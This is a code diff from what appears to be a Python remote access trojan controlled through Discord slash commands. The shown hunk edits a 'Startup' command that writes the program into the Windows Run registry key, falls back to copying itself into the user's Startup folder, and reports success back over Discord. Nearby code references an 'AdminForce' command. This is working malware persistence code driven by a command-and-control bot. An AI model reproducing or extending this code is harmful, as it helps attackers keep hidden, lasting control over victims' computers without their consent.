@@ -572,16 +572,18 @@ async def AdminForce_command(ctx: SlashContext):
 
 
 @slash.slash(name="Startup", description="Add the program to startup", guild_ids=g)
-async def Startup_command(ctx: SlashContext, name: str):
+async def Startup_command(ctx: SlashContext, reg_name: str):
     if ctx.channel.name == channel_name:
         try:
             key1 = winreg.HKEY_CURRENT_USER
             key_value1 ="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
             open_ = winreg.CreateKeyEx(key1,key_value1,0,winreg.KEY_WRITE)
 
-            winreg.SetValueEx(open_,name,0,winreg.REG_SZ, sys.argv[0])
+            winreg.SetValueEx(open_,reg_name,0,winreg.REG_SZ, sys.argv[0])
             open_.Close()
+            await ctx.send("Successfully added it to `run` startup")
         except PermissionError:
             shutil.copy(sys.argv[0], os.getenv("appdata")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+os.path.basename(sys.argv[0]))
+            await ctx.send("Permission was denied, added it to `startup folder` instead")
 
 client.run(token)
